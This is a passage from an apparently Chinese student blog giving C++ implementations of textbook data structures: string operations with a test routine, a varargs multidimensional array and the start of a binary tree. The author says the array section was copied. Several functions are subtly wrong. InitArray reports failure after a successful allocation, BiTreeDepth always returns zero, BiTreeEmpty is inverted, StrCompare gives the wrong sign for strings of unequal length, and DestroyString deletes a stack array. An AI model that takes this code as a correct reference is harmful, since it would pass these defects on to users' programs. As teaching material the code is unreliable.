class="keyword">if</span>(<span class="built_in">strlen</span>(S)!=<span class="number">0</span>) StrAssign(T, S);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrEmpty</span><span class="params">(SString S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span> || <span class="built_in">strlen</span>(S)==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrLength</span><span class="params">(SString S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>( ;S[l++];);</span><br><span class="line">    <span class="keyword">return</span> l<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrCompare</span><span class="params">(SString S, SString T)</span> </span>&#123;</span><br><span class="line"><span class="comment">//  return strcmp(S, T);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;min(StrLength(S), StrLength(T)); i++)</span><br><span class="line">        <span class="keyword">if</span>(S[i]&gt;T[i]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S[i]&lt;T[i]) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(StrLength(S) &lt; StrLength(T)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(StrLength(S) == StrLength(T)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearString</span><span class="params">(SString &amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(S, <span class="number">0</span>, <span class="keyword">sizeof</span>(S));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Concat</span><span class="params">(SString &amp;T, SString S1, SString S2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(StrEmpty(S1)) &#123; StrCopy(T, S2); <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(StrEmpty(S2)) &#123; StrCopy(T, S1); <span class="keyword">return</span>; &#125;</span><br><span class="line">    StrCopy(T, S1);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;StrLength(S2); i++) T[StrLength(S1)+i]=S2[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubString</span><span class="params">(SString &amp;sub, SString S, <span class="keyword">int</span> pos, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    pos--;</span><br><span class="line">    ClearString(sub);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=pos; i&lt;min(StrLength(S), pos+len); i++) </span><br><span class="line">        sub[i-pos]=S[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Index</span><span class="params">(SString S, SString T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">    pos--;</span><br><span class="line">    <span class="keyword">if</span>(pos&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n=StrLength(S), m=StrLength(T);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=pos; i&lt;n-m+<span class="number">1</span>; i++) &#123;</span><br><span class="line">        SString sub;</span><br><span class="line">        SubString(sub, S, i+<span class="number">1</span>, m);</span><br><span class="line">        <span class="keyword">if</span>(StrCompare(sub, T)==<span class="number">0</span>) <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrInsert</span><span class="params">(SString &amp;S, <span class="keyword">int</span> pos, SString T)</span> </span>&#123;</span><br><span class="line">    pos--;</span><br><span class="line">    <span class="keyword">if</span>(pos&lt;<span class="number">0</span> || pos&gt;StrLength(S)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> lt=StrLength(T), ls=StrLength(S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=ls<span class="number">-1</span>; i&gt;=pos; --i) &#123;</span><br><span class="line">        S[i+lt] = S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=pos; i&lt;pos+lt; i++) S[i]=T[i-pos];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrDelete</span><span class="params">(SString &amp;S, <span class="keyword">int</span> pos, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    pos--;</span><br><span class="line">    <span class="keyword">if</span>(pos&lt;<span class="number">0</span> || pos+len&gt;StrLength(S)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> ls=StrLength(S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=pos+len; i&lt;ls; i++) S[i-len]=S[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=ls-len; i&lt;ls; i++) S[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Replace</span><span class="params">(SString &amp;S, SString T, SString V)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lt=StrLength(T), lv=StrLength(V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;StrLength(S); i++) &#123;</span><br><span class="line">        SString sub;</span><br><span class="line">        SubString(sub, S, i+<span class="number">1</span>, lt);</span><br><span class="line">        <span class="keyword">if</span>(StrCompare(sub, T)==<span class="number">0</span>) &#123;</span><br><span class="line">            StrDelete(S, i+<span class="number">1</span>, lt);</span><br><span class="line">            StrInsert(S, i+<span class="number">1</span>, V);</span><br><span class="line">            i=i+lv<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyString</span><span class="params">(SString &amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> S;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>测试<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SString S1, S2, S3;</span><br><span class="line">    ClearString(S1), ClearString(S2), ClearString(S3);</span><br><span class="line">    StrAssign(S1, <span class="string">"hello"</span>);</span><br><span class="line">    StrAssign(S2, <span class="string">"world"</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; S1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; S2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">strlen</span>(S1) &lt;&lt; <span class="string">" "</span> &lt;&lt; StrLength(S1) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">strlen</span>(S2) &lt;&lt; <span class="string">" "</span> &lt;&lt; StrLength(S2) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//  assert(strlen(S1)==StrLength(S1));</span></span><br><span class="line"><span class="comment">//  assert(strlen(S2)==StrLength(S2));</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; StrCompare(S1, S2) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; StrCompare(<span class="string">"a"</span>, <span class="string">"aa"</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; StrCompare(<span class="string">"a"</span>, <span class="string">"a"</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; StrCompare(<span class="string">"aa"</span>, <span class="string">"a"</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    Concat(S3, S1, S2); <span class="built_in">cout</span> &lt;&lt; S3 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    SubString(S3, S1, <span class="number">2</span>, <span class="number">3</span>); <span class="built_in">cout</span> &lt;&lt; S3 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; Index(S1, <span class="string">"l"</span>, <span class="number">1</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; Index(S1, <span class="string">"l"</span>, <span class="number">5</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    StrDelete(S1, <span class="number">2</span>, <span class="number">3</span>); <span class="built_in">cout</span> &lt;&lt; S1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    StrInsert(S1, <span class="number">1</span>, <span class="string">"ool"</span>); <span class="built_in">cout</span> &lt;&lt; S1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Replace(S1, <span class="string">"o"</span>, <span class="string">"l"</span>); <span class="built_in">cout</span> &lt;&lt; S1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Replace(S1, <span class="string">"l"</span>, <span class="string">"ll"</span>); <span class="built_in">cout</span> &lt;&lt; S1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>没时间了…不是自己写的，照着打的…<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ARRAY_DIM 8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ElemType *base;</span><br><span class="line">    <span class="keyword">int</span> dim;</span><br><span class="line">    <span class="keyword">int</span> *bounds;</span><br><span class="line">    <span class="keyword">int</span> *constants;</span><br><span class="line">&#125; Array;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitArray</span><span class="params">(Array &amp;A, <span class="keyword">int</span> dim, ...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dim&lt;<span class="number">1</span> || dim&gt;MAX_ARRAY_DIM) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    A.dim=dim;</span><br><span class="line">    A.bounds=(<span class="keyword">int</span>*) <span class="built_in">malloc</span>(dim*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">int</span> elemtotal=<span class="number">1</span>;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, dim);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;dim; i++) &#123;</span><br><span class="line">        A.bounds[i]=va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">        <span class="keyword">if</span>(A.bounds[i]&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        elemtotal *= A.bounds[i];</span><br><span class="line">    &#125;</span><br><span class="line">    va_end(ap);</span><br><span class="line">    A.base=(ElemType *)<span class="built_in">malloc</span>(elemtotal * <span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">    <span class="keyword">if</span>(A.base) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    A.constants=(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(dim*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    A.constants[dim<span class="number">-1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=dim<span class="number">-2</span>; i&gt;=<span class="number">0</span>; --i)</span><br><span class="line">        A.constants[i]=A.bounds[i+<span class="number">1</span>]*A.constants[i+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DestroyArray</span><span class="params">(Array &amp;A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!A.base) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(A.base); A.base=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(!A.bounds) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(A.bounds); A.bounds=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(!A.constants) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(A.constants); A.constants=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Locate</span><span class="params">(Array A, va_list ap, <span class="keyword">int</span> &amp;off)</span> </span>&#123;</span><br><span class="line">    off=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;A.dim; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> ind = va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">        <span class="keyword">if</span>(ind&lt;<span class="number">0</span> || ind&gt;=A.bounds[i]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        off+=A.constants[i]*ind;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Value</span><span class="params">(Array A, ElemType &amp;e, ...)</span> </span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, e);</span><br><span class="line">    <span class="keyword">int</span> result, off;</span><br><span class="line">    <span class="keyword">if</span>((result=Locate(A, ap, off))&lt;=<span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">    e=*(A.base+off);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Assign</span><span class="params">(Array &amp;A, ElemType e,...)</span> </span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, e);</span><br><span class="line">    <span class="keyword">int</span> result, off;</span><br><span class="line">    <span class="keyword">if</span>((result=Locate(A, ap, off))&lt;=<span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">    *(A.base+off)=e;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><p>基本功能和操作<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> TElemType;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> &#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    BiTNode *lc, *rc, *f;</span><br><span class="line">    </span><br><span class="line">    BiTNode() &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;lc = <span class="keyword">this</span>-&gt;rc = <span class="keyword">this</span>-&gt;f = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BiTNode(TElemType d, BiTNode *l=<span class="literal">NULL</span>, BiTNode *r=<span class="literal">NULL</span>, BiTNode *f = <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data = d;</span><br><span class="line">        <span class="keyword">this</span>-&gt;lc = l;</span><br><span class="line">        <span class="keyword">this</span>-&gt;rc = r;</span><br><span class="line">        <span class="keyword">this</span>-&gt;f = f;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> BiTNode *BiTree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitBiTree</span><span class="params">(BiTree &amp;T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T) <span class="keyword">delete</span> T;</span><br><span class="line">    T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyBiTree</span><span class="params">(BiTree &amp;T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>;</span><br><span class="line">    DestroyBiTree(T-&gt;lc);</span><br><span class="line">    DestroyBiTree(T-&gt;rc);</span><br><span class="line">    <span class="keyword">if</span>(T) <span class="keyword">delete</span> T;</span><br><span class="line">    T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree &amp;T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x; <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>) &#123; T=<span class="literal">NULL</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    T = <span class="keyword">new</span> BiTNode(x);</span><br><span class="line">    CreateBiTree(T-&gt;lc);</span><br><span class="line">    CreateBiTree(T-&gt;rc);</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;lc) T-&gt;lc-&gt;f=T;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;rc) T-&gt;rc-&gt;f=T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearBiTree</span><span class="params">(BiTree &amp;T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>;</span><br><span class="line">    ClearBiTree(T-&gt;lc);</span><br><span class="line">    ClearBiTree(T-&gt;rc);</span><br><span class="line">    <span class="keyword">delete</span> T; T=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BiTreeEmpty</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> T?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BiTreeDepth</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> max(BiTreeDepth(T-&gt;lc), BiTreeDepth(T-&gt;rc));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">Root</span><span class="params">(BiTree T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(T-&gt;f) T=T-&gt;f;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Value</span><span class="params">(BiTree T, BiTree e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e) <span class="keyword">return</span> e-&gt;data;</span><br><span class="line"><span class="comment">//    if(!T) return 0;</span></span><br><span class="line"><span class="comment">//    if(T==e) return e-&gt;data;</span></span><br><span class="line"><span class="comment">//    int lcv = Value(T-&gt;lc, e);</span></span><br><span class="line"><span class="comment">//    int rcv = Value(T-&gt;rc, e);</span></span><br><span class="line"><span class="comment">//    if(lcv) return lcv;</span></span><br><span class="line"><span class="comment">//    if(rcv) return rcv;</span></span><br><span class="line"><span class="comment">//    return 0;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Assign</span><span class="params">(BiTree T, BiTree &amp;e, TElemType value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e) e-&gt;data = value;</span><br><span class="line"><span class="comment">//    if(!T) return 0;</span></span><br><span class="line"><span class="comment">//    if(T==e) &#123; e-&gt;data = value; return; &#125;</span></span><br><span class="line"><span class="comment">//    Assign(T-&gt;lc, e, value);</span></span><br><span class="line"><span class="comment">//    Assign(T-&gt;rc, e, value);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">Parent</span><span class="params">(BiTree T, BiTree e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e) <span class="keyword">return</span> e-&gt;f;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">LeftChild</span><span class="params">(BiTree T, BiTree e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e) <span class="keyword">return</span> e-&gt;lc;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">RightChild</span><span class="params">(BiTree T, BiTree e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e) <span class="keyword">return</span> e-&gt;rc;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">LeftSibling</span><span class="params">(BiTree T, BiTree e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!e-&gt;f) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(e==e-&gt;f-&gt;rc) <span class="keyword">return</span> e-&gt;f-&gt;lc;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">RightSibling</span><span class="params">(BiTree T, BiTree e)</span> </span>&#123;</span><br><span class="line">    <span 